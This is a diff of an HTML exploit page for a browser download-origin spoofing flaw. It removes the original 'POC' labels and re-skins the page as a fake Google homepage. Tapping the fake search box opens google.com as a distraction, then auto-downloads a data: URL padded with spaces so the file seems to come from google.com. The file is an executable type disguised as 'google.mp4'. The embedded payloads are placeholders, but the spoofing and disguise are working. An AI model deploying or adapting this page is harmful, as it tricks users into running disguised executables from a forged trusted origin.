@@ -3,37 +3,47 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Download Origin Spoof POC</title>
+  <title>Google</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #fff; padding: 40px 20px; text-align: center; }
-    h2 { color: #333; margin-bottom: 16px; }
-    input {
-      padding: 14px 20px; font-size: 16px; border: 2px solid #4285f4;
-      border-radius: 24px; width: 260px; text-align: center; cursor: pointer; outline: none;
+    body {
+      font-family: Arial, sans-serif; background: #fff;
+      padding: 60px 20px; text-align: center;
     }
-    p { color: #666; font-size: 13px; margin-top: 16px; }
+    .logo { font-size: 64px; font-weight: 400; margin-bottom: 24px; }
+    .g1{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}
+    .g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
+    input {
+      width: 80%; max-width: 400px; padding: 14px 20px; font-size: 16px;
+      border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
+      box-shadow: 0 1px 6px rgba(32,33,36,.1); cursor: pointer; text-align: center;
+    }
+    .info { color: #999; font-size: 12px; margin-top: 24px; }
   </style>
 </head>
 <body>
-  <h2>POC - Download Origin Spoof</h2>
-  <input type="text" id="triggerInput" placeholder="Tap here" readonly>
-  <p>Tap input → opens Google + download appears from Google</p>
 
-  <script>
-    document.getElementById('triggerInput').addEventListener('click', function() {
-      // Open Google in new tab (distraction - like original POC)
-      window.open('https://www.google.com', '_blank');
+<div class="logo">
+  <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+</div>
 
-      // Trigger download after short delay
-      setTimeout(function() {
-        var a = document.createElement('a');
-        a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/vnd.android.package-archive;base64,UEsDBBQAAAAAAAAAIVjKxoiZZAAAAGQAAAALAAAAY2xhc3Nlcy5kZXgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQSwECFAAUAAAAAAAAACFYysaImWQAAABkAAAACwAAAAAAAAAAAAAAgAEAAAAAY2xhc3Nlcy5kZXhQSwUGAAAAAAEAAQA5AAAAjQAAAAAA';
-        a.download = 'google-play-services.apk';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }, 500);
-    });
-  </script>
+<input type="text" id="q" placeholder="Search Google or type a URL" autocomplete="off" readonly>
+
+<p class="info">Tap the search box</p>
+
+<script>
+document.getElementById('q').addEventListener('click', function() {
+  window.open('https://www.google.com', '_blank');
+
+  setTimeout(function() {
+    var a = document.createElement('a');
+    a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';
+    a.download = 'google.mp4';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }, 500);
+});
+</script>
+
 </body>
 </html>
